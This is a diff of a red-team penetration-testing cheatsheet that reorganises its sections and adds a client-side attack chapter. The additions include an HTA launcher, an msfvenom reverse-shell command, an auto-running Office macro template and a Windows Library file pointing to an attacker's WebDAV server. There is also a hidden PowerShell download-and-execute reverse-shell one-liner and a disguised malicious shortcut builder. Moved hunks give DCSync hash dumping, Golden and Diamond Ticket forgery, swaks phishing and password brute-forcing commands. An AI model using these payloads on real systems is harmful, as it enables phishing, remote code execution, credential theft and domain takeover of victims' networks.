@@ -1,4 +1,3 @@
-
 This cheatsheet contains commands and short scripts that accomplish useful things for penetration testing/red teaming.
 
 Other great cheatsheets:
@@ -15,7 +14,7 @@ script scanning on those ports.
 
 ```sh
 VICTIM_IP=VICTIM_IP
-sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn -sV --script "default,safe,vuln" -oA tcp-all
+sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -sV --script "default,safe,vuln" -oA tcp-all
 ```
 
 ## 1.2 Nmap
@@ -379,6 +378,15 @@ dism /online /Enable-Feature /FeatureName:TelnetClient
 Other ideas:
 - send email to user (client-side exploit)
 - send email to invalid address, get DSN report (info leaks?)
+
+**Sending email via cmdline:**
+
+```sh
+# first create attachment and body files
+
+# then send email with swaks
+swaks -t recipient@example.com -t recipient2@example.com --from sender@example.com --attach @config.Library-ms --server VICTIM_IP --body @body.txt --header "Subject: Need help" --suppress-data -ap
+```
 
 See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
@@ -892,12 +900,12 @@ Things to try when testing for traversal vuln:
 - Use backslashes (`\`) instead of forward slashes (`/`), especially on Windows.
 - URL encode the `../` -> `%2E%2E%2F` to bypass filters
 - Double-encode the `../` -> `%252E%252E%252F`; IIS 5.0 and earlier
-- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve2022-1744][cve2022-1744]
+- UTF-8 encode the `../` -> `%C0%AE%C0%AE%2F` (`%c0%ae` is `.`); [cve-2022-1744][cve-2022-1744]{:target="_blank"}
 - Use `....//` instead of `../` to bypass filters
 - Append null byte (`%00`) if you suspect file extension is getting added
 - Check out [DotDotPwn](https://github.com/wireghoul/dotdotpwn) fuzzing tool.
 
-[cve2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744
+[cve-2022-1744]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1744
 
 
 When using `curl` to test, you may need to include the `--path-as-is` flag:
@@ -907,7 +915,7 @@ curl --path-as-is http://localhost/?page=/../../../../etc/passwd
 ```
 
 
-Files to try:
+**Files to try:**
 - `/etc/passwd`
 - `/etc/shadow` if permissions allow
 - `C:\Windows\System32\drivers\etc\hosts` - good to test traversal vuln
@@ -1253,12 +1261,12 @@ wpscan --update --url http://$VICTIM_IP/
 
 # aggressive scan:
 wpscan --update \
-       --url http://$VICTIM_IP/ \
+       --random-user-agent \
        --enumerate ap,at,cb,dbe,u \
        --detection-mode aggressive \
-       --random-user-agent \
        --plugins-detection aggressive \
-       --plugins-version-detection aggressive
+       --plugins-version-detection aggressive \
+       --url http://$VICTIM_IP/
 
 # scan with cmsmap (https://github.com/Dionach/CMSmap):
 cmsmap -o cmsmap.txt -d http://$VICTIM_IP
@@ -1775,7 +1783,7 @@ The user running MSSQL server will have the privilege token **SeImpersonatePrivi
 ```sh
 # Be carefull with the number of password in the list, this could lock-out accounts
 # Use the NetBIOS name of the machine as domain, if needed
-crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
+crackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP
 hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
 medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
 nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
@@ -1858,9 +1866,9 @@ Simple command execution:
 
 ```bash
 # Username + Password + CMD command
-crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
+crackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x "whoami" $VICTIM_IP
 # Username + Hash + PS command
-crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
+crackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP
 ```
 
 Using interactive session:
@@ -3266,6 +3274,201 @@ msf-pattern_offset -q EIP_VAL
 # find 'jmp esp' gadget, excluding bad bytes in the pointer
 !mona jmp -r esp -cpb '\x00\x51'
 ```
+
+
+
+## 3.6 Client-Side Attacks
+
+### 3.6.1 HTA Files
+
+Windows Internet Explorer and Edge browsers support *HTML Applications* (`.hta` files) that can run arbitrary code using Windows scripting languages like VBScript encapsulated in HTML. Instead of being run in the security context of the browser (where access to system resources is limited), the browser automatically detects the `.hta` extension and executes it with the user's permissions via `mshta.exe` (after prompting the user if they want to run it).
+
+Send one of these files to a user (or a link to one), and if they execute it, you win.
+
+Here's the basic template (save as `derp.hta`):
+
+```html
+<html>
+<head>
+<script language="VBScript">
+
+  <!-- just opens cmd terminal -->
+  var c= 'cmd.exe'
+  new ActiveXObject('WScript.Shell').Run(c);
+
+</script>
+</head>
+<body>
+<script language="VBScript">
+<!-- close this HTA window now that script running -->
+self.close();
+</script>
+</body>
+</html>
+```
+
+You can use msfvenom to generate an HTA file that will give you a reverse shell. You can either use the generated file directly or replace the top script block with a msfvenom payload:
+
+```sh
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=ATTACKER_IP
+```
+
+
+### 3.6.2 Malicious Office Macros
+
+You can exploit windows machines by sending a malicious Office file containing macros to the user. When they open the document, it'll execute your payload in your macro.
+
+Here's the basic template of a malicious macro (replace the string "MALICIOUS COMMANDS HERE" with your payload):
+
+```vb
+Sub Document_Open()
+    PWN
+End Sub
+
+Sub AutoOpen()
+    PWN
+End Sub
+
+Sub PWN()
+    Const DontWaitUntilFinished = False,  WaitUntilFinished = True
+    Const ShowWindow = 1, DontShowWindow = 0
+    Dim cmd as String
+    cmd = cmd + "MALICIOUS COMMANDS HERE"
+    set sh = CreateObject("WScript.Shell")
+    sh.Run cmd, DontShowWindow
+End Sub
+```
+
+Because VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a `powercat.ps1` reverse shell payload into the string.
+
+- [mkpowercat.py](tools/win/mkpowercat.py)
+- [vbsify.py](tools/win/vbsify.py)
+
+Example Usage:
+
+```sh
+# create powercat macro payload
+./mkpowercat.py | ./vbsify.py
+
+# put powercat in current directory
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+
+# host file on http server
+python3 -m http.server 80
+
+# catching reverse shell callback:
+nc -lvnp 443
+```
+
+Once you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.
+
+
+### 3.6.3 Windows Library Files
+
+You can use Windows Library files to mount a pseudo-filesystem pointing to an attacker-owned WebDAV server, which hosts malicious files you want the user to execute. The benefit of this technique is that antivirus doesn't seem to scan files on your WebDAV server like it does emailed office macros.
+
+This technique uses a malicious `.lnk` file that starts a reverse shell when the user clicks on it.
+
+First, start your WebDAV server:
+
+```sh
+# install wsgidav (WebDAV server)
+pip3 install --user wsgidav
+
+# make a folder that we want to host publicly
+mkdir webdav
+
+# start the server with open access
+wsgidav --host=0.0.0.0 --port=8000 --auth=anonymous --root webdav/
+# you can confirm this is running by going to http://127.0.0.1:8000 in your browser
+```
+
+
+To make a Windows Library file that points to our WebDAV server, we create an XML file with the `.Library-ms` extension. The file's basename is the "path" displayed to the user in their Explorer window. Make it blend in for client-side attacks.
+
+Change the `<url>` field below, and save it as `Helpers.Library-ms` (or whatever):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <!-- version can be any number we choose -->
+  <version>7</version>
+  <!-- pin directory in Windows Explorer -->
+  <isLibraryPinned>true</isLibraryPinned>
+  <!-- imageres.dll pics from all Windows icons -->
+  <!-- '-1003' is Pictures folder icon -->
+  <!-- '-1002' is Documents folder icon -->
+  <iconReference>imageres.dll,-1003</iconReference>
+  <!-- templateInfo determines appearance and columns visible in Explorer window -->
+  <templateInfo>
+    <!-- Documents GUID -->
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <!-- searchConnector... specifies the storage location(s) the library points to -->
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <!-- use default behavior when user saving at this location, to blend in -->
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <!-- not documented in Microsoft Documentation webpage; used for compatibility -->
+      <isSupported>false</isSupported>
+      <!-- the location, our WebDAV URL -->
+      <simpleLocation>
+        <url>http://192.168.45.213:8000</url>  <!-- <===== CHANGE ME!!!!! -->
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+From here must create a malicious `.lnk` file that starts a reverse shell using a payload like the following as the link target:
+
+```powershell
+powershell -w hidden -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell"
+```
+
+If you want to base64 encode the above PowerShell payload, you may run into a character limit in the Windows shortcut GUI. It can only create a shortcut with 259 characters in the Target + Arguments fields, but you can use PowerShell to make more robust shortcuts, with longer payloads.
+
+To generate the base64 payload, I recommend using my [`mkpowercat.py`](tools/mkpowercat.py) script.
+
+```sh
+# use my mkpowercat script
+./mkpowercat.py
+
+# manually convert to base64 (replace LISTEN_IP)
+lhost=LISTEN_IP;echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p 443 -e powershell" | iconv -t UTF-16LE | base64 | tr -d '\n';echo
+```
+
+Insert payload and run on windows:
+
+```powershell
+# make a custom malicious shortcut
+$path                      = "$([Environment]::GetFolderPath('Desktop'))\automatic_configuration.lnk"
+$wshell                    = New-Object -ComObject Wscript.Shell
+$shortcut                  = $wshell.CreateShortcut($path)
+
+$shortcut.IconLocation     = "%SystemRoot%\System32\imageres.dll,63" # app config icon
+
+$shortcut.TargetPath       = "powershell.exe"
+$shortcut.Arguments        = "-nop -ep bypass -w hidden -e BASE64PAYLOADHERE"
+$shortcut.WorkingDirectory = "C:"
+$shortcut.HotKey           = "" # can set to some hotkey combo like CTRL+C
+$shortcut.Description      = "Nope, not malicious"
+
+$shortcut.WindowStyle      = 7
+                           # 7 = Minimized window
+                           # 3 = Maximized window
+                           # 1 = Normal    window
+$shortcut.Save()
+# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
+```
+
+References:
+
+- [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
+
+
+
 
 # 4 Windows
 
@@ -5645,38 +5848,6 @@ iwr -UseDefaultCredentials http://VICTIM
 
 Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).
 
-### 5.2.6 Domain Controller Synchronization (DCSync)
-
-DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.
-
-When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.
-
-To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.
-
-Performing dcsync attack:
-
-```powershell
-# From inside mimikatz shell
-# grab all hashes from DC
-lsadump::dcsync
-# grab hashes of specific user
-lsadump::dcsync /user:corp\Administrator
-
-# Kali: use impacket
-# full dump of hashes
-# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
-impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
-# grab specific user's hashes
-impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
-```
-
-Crack dumped NTLM hashes:
-
-```sh
-❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
-```
-
-
 ## 5.3 Lateral Movement in Active Directory
 
 Pass-the-Hash (PtH) only works for servers using NTLM authentication (not Kerberos only). Authentication is performed using an SMB connection, so port 445 must be open, the Windows File and Printer Sharing feature to be enabled (it is by default), and the `ADMIN$` share to be available. It also requires local administrator rights. Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.
@@ -5932,67 +6103,35 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
 
 ## 5.4 Active Directory Persistence
 
-### 5.4.1 Golden Ticket
+### 5.4.1 Domain Controller Synchronization (DCSync)
 
-A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.
+DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.
 
-Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.
+When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.
 
-Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.
+To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.
+
+Performing dcsync attack:
 
 ```powershell
-# extract the Domain SID from the user's SID
-# (remove the RID and keep the rest. RID is last set of numbers in SID)
-whoami /user
+# From inside mimikatz shell
+# grab all hashes from DC
+lsadump::dcsync
+# grab hashes of specific user
+lsadump::dcsync /user:corp\Administrator
 
-# in mimikatz shell
-privilege::debug
-# remove all existing tickets, so they don't conflict with the one you're forging
-kerberos::purge
-# forge golden ticket, load into memory with /ptt
-# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
-# use '/aes256:' for AES256 kerberos hash
-kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
-# start cmd shell with new ticket in its context
-misc::cmd cmd
-
-# alternatively, use Rubeus (/aes256: if desired)
-.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
-# here's loading a saved ticket:
-.\Rubeus.exe ptt /ticket:ticket.kirbi
-
-# list tickets in memory, make sure its there
-klist
-
-# now use overpass-the-hash technique (full domain name required)
-.\PsExec.exe \\dc1 cmd.exe
+# Kali: use impacket
+# full dump of hashes
+# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
+impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
+# grab specific user's hashes
+impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
 ```
 
-You can forge a Golden Ticket on Kali:
+Crack dumped NTLM hashes:
 
 ```sh
-# look up domain SID
-impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM
-
-# use -aesKey for AES256 hashes
-impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
-export KRB5CCNAME=$(pwd)/USERNAME.ccache
-impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
-# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
-```
-
-Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.
-
-```powershell
-# Get user RID
-whoami /user
-
-.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
-# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
-# /ticketuser is the username of the principal to impersonate.
-# /ticketuserid is the domain RID of that principal.
-# /groups are the desired group RIDs (512 being Domain Admins).
-# /krbkey is the krbtgt AES256 hash. 
+❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
 ```
 
 
@@ -6055,6 +6194,70 @@ impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PA
 ```
 
 
+
+
+### 5.4.3 Golden Ticket
+
+A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.
+
+Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.
+
+Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.
+
+```powershell
+# extract the Domain SID from the user's SID
+# (remove the RID and keep the rest. RID is last set of numbers in SID)
+whoami /user
+
+# in mimikatz shell
+privilege::debug
+# remove all existing tickets, so they don't conflict with the one you're forging
+kerberos::purge
+# forge golden ticket, load into memory with /ptt
+# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
+# use '/aes256:' for AES256 kerberos hash
+kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
+# start cmd shell with new ticket in its context
+misc::cmd cmd
+
+# alternatively, use Rubeus (/aes256: if desired)
+.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
+# here's loading a saved ticket:
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+
+# list tickets in memory, make sure its there
+klist
+
+# now use overpass-the-hash technique (full domain name required)
+.\PsExec.exe \\dc1 cmd.exe
+```
+
+You can forge a Golden Ticket on Kali:
+
+```sh
+# look up domain SID
+impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM
+
+# use -aesKey for AES256 hashes
+impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
+export KRB5CCNAME=$(pwd)/USERNAME.ccache
+impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
+# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
+```
+
+Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.
+
+```powershell
+# Get user RID
+whoami /user
+
+.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
+# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
+# /ticketuser is the username of the principal to impersonate.
+# /ticketuserid is the domain RID of that principal.
+# /groups are the desired group RIDs (512 being Domain Admins).
+# /krbkey is the krbtgt AES256 hash. 
+```
 
 
 # 6 Linux
@@ -6901,6 +7104,21 @@ More Windows IIS log and config paths [here](https://techcommunity.microsoft.com
 Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx
 ```
 
+#### 7.1.3.1 git repos
+
+Sometimes git repos contain sensitive info in the git history.
+
+```sh
+# view commit history
+git log
+
+# show changes for a commit
+git show COMMIT_HASH
+
+# search for sensitive keywords
+git grep -i password
+```
+
 
 
 ## 7.2 File Transfers
@@ -7109,81 +7327,6 @@ mkdir webdav
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
 # you can confirm this is running by going to http://127.0.0.1 in your browser
 ```
-
-
-
-To make a Windows Library file that points to our WebDAV server, we create an XML file with the `.library-ms` extension. The file's basename is the "path" displayed to the user in their Explorer window. Make it blend in for client-side attacks.
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
-  <name>@windows.storage.dll,-34582</name>
-  <!-- version can be any number we choose -->
-  <version>7</version>
-  <!-- pin directory in Windows Explorer -->
-  <isLibraryPinned>true</isLibraryPinned>
-  <!-- imageres.dll pics from all Windows icons -->
-  <!-- '-1003' is Pictures folder icon -->
-  <!-- '-1002' is Documents folder icon -->
-  <iconReference>imageres.dll,-1003</iconReference>
-  <!-- templateInfo determines appearance and columns visible in Explorer window -->
-  <templateInfo>
-    <!-- Documents GUID -->
-    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
-  </templateInfo>
-  <!-- searchConnector... specifies the storage location(s) the library points to -->
-  <searchConnectorDescriptionList>
-    <searchConnectorDescription>
-      <!-- use default behavior when user saving at this location, to blend in -->
-      <isDefaultSaveLocation>true</isDefaultSaveLocation>
-      <!-- not documented in Microsoft Documentation webpage; used for compatibility -->
-      <isSupported>false</isSupported>
-      <!-- the location, our WebDAV URL -->
-      <simpleLocation>
-        <url>http://192.168.45.213</url>  <!-- <===== CHANGE ME!!!!! -->
-      </simpleLocation>
-    </searchConnectorDescription>
-  </searchConnectorDescriptionList>
-</libraryDescription>
-```
-
-From here you can do a client-side attack by dropping a malicious `.lnk` file that starts a reverse shell using a payload like the following:
-
-```powershell
-powershell -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell"
-```
-
-You can only create a shortcut with 259 characters in the Target + Arguments through the Windows GUI, but you can use PowerShell to make more robust shortcuts, with longer payloads.
-
-```powershell
-# make a custom malicious shortcut
-$path                      = "$([Environment]::GetFolderPath('Desktop'))\automatic_configuration.lnk"
-$wshell                    = New-Object -ComObject Wscript.Shell
-$shortcut                  = $wshell.CreateShortcut($path)
-
-$shortcut.IconLocation     = "%SystemRoot%\System32\imageres.dll,63" # app config icon
-
-$shortcut.TargetPath       = "powershell.exe"
-$shortcut.Arguments        = "-nop -exec bypass -w hidden -enc 'BASE64PAYLOADHERE'"
-$shortcut.WorkingDirectory = "C:"
-$shortcut.HotKey           = "" # can set to some hotkey combo like CTRL+C
-$shortcut.Description      = "Nope, not malicious"
-
-$shortcut.WindowStyle      = 7
-                           # 7 = Minimized window
-                           # 3 = Maximized window
-                           # 1 = Normal    window
-$shortcut.Save()
-# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
-```
-
-To generate the payload, I recommend using my [`mkpowercat.py`](tools/mkpowercat.py) script.
-
-
-
-References:
-
-- [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
 
 
 
